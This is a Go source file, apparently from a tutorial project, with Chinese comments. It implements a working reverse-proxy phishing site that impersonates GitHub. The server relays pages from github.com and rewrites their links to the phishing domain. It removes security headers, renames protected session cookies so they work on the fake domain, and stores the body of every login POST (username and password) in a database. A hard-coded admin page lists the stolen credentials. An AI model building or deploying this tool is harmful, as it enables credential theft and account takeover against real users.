package main

import (
	"bytes"
	"flag"
	"fmt"
	"go-fishing/db"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const (
	upstreamURL = "https://github.com"
	userAccount = "ewan"
	userPswd    = "ewan1234"
)

var (
	phishURL  string
	phishPort string
)

func main() {
	// 把 --phishURL=... 的值存進變數 phishURL 裡面
	// 預設值是 "http://localhost:8080"
	// "部屬在哪個網域" 是這個參數的說明，自己看得懂就可以了
	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部屬在哪個網域")
	// 把 --port=... 的值存進變數 port 裡面
	// 預設值是 ":8080"
	flag.StringVar(&phishPort, "port", ":8080", "部屬在哪個 port")
	flag.Parse()

	db.Connect()

	// 路徑是 /phish-admin 才交給 adminHandler 處理
	http.HandleFunc("/fishing-admin", adminHandler)

	// 其他的請求就交給 handler 處理
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(phishPort, nil)
	if err != nil {
		panic(err)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)

	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newCookieValue := strings.Replace(v, "domain=.github.com;", "", -1)
		// 把 secure 移除
		newCookieValue = strings.Replace(newCookieValue, "secure;", "", 1)
		// 幫 cookie 改名
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		//fmt.Println("newCookieValue:" + newCookieValue)
		newCookieValue = strings.Replace(newCookieValue, "__Host", "XXHost", -1)
		newCookieValue = strings.Replace(newCookieValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newCookieValue)
	}
	// Set-Cookie 之前已經有複製而且取代 secure, domain 了
	// 所以複製除了 Set-Cookie 之外的 header
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}
	// 把安全性的 header 統統刪掉
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	//fmt.Println(header["Set-Cookie"])

	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	// 轉傳正確的 status code 給瀏覽器
	w.WriteHeader(statusCode)
	w.Write(body)

}

func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method

	// 把 body 讀出來轉成 string
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)

	// 如果是 POST 到 /session 的請求
	// 就把 body 存進資料庫內（帳號密碼 GET !!）
	// 取得原請求的 url，把它的域名替換成真正的 Github
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	// 把原請求的 cookie 複製到 req 的 cookie 裡面
	// 這樣請求被發到 Github 時就會帶上 cookie
	//req.Header["Cookie"] = r.Header["Cookie"]

	// 複製整個 request header
	req.Header = r.Header

	// 取代 header 中的 Origin, Referer 網址
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Del("Accept-Encoding")
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)

	for i, value := range req.Header["Cookie"] {
		// 取代 cookie 名字
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}
	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()
	return respBody, resp.Header, resp.StatusCode
}

func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-type")
	isHTML := strings.Contains(contentType, "text/html")
	if !isHTML {
		return body
	}
	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}

	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	// 取得使用者輸入的帳號密碼
	username, password, ok := r.BasicAuth()

	// 判斷帳密對錯
	if username == userAccount && password == userPswd && ok {
		// 用寫好的 db.SelectAll() 撈到所有資料
		strs := db.SelectAll()
		// 在每個字串之間加兩個換行再傳回前端
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		// 告訴瀏覽器這個頁面需要 Basic Auth
		w.Header().Add("WWW-Authenticate", "Basic")
		// 回傳 `401 Unauthorized`
		w.WriteHeader(401)
		w.Write([]byte("授權失敗"))
	}
}
